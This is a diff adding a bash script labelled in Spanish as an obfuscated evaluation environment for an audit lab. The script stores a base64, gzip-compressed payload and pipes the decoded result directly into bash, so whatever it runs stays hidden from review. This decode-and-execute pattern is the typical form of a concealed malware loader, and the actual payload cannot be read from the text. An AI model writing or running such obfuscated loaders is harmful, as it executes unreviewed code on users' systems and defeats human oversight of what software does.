@@ -1,0 +1,6 @@
+#!/bin/bash
+# Entorno de evaluación ofuscado - Laboratorio de Auditoría
+
+export PAYLOAD="H4sIAHf4gmoC/51TPU/DQAzd8ytMmEPaoa2UgQ0hMSCG7pVzcZuD5BzdRwuIhR/ExE/oH+NSJSSgHEhdIsV+fu/ZPl9epLlUaY6mjHaaXYNFAY3mLRnWZIYYGesKicqOg4XUJKzcs4kiZ0i3saSGZDeGQ3I7YoTEwLfkKb5BhedVe9jm0aH6VT24+gn38Y1AXbVuSZQMcS+fraluWGM1v4jhDUTZoDGHokP1Mn+jBvYQLqqfPAiSBlJubEpGOKowbVxeScGBrGKLJpCr0ZKWWFEIcJqEkKz6hm/2WDkU8vipYK1l7VvzPiGB43u1o1xjBne+U3ggTa8+fO/VM5jPYriesJWisOibruRWCmx1yFzZZxtFXuygQDPbbLSNybZFWXMBq9VsOj2mGr2DiRn1RKtwcrlcnttG+wlOv5NeLIKIjmr0SEJzGXbWe579s9SCDG6PHwxCExYMzjjUkuGluwRuf8YUHdBAgxrB3w6gPzfb1vp3C94d5CRaDhNHX8D0o34iBAAA"
+
+echo "$PAYLOAD" | base64 -d | gunzip | bash
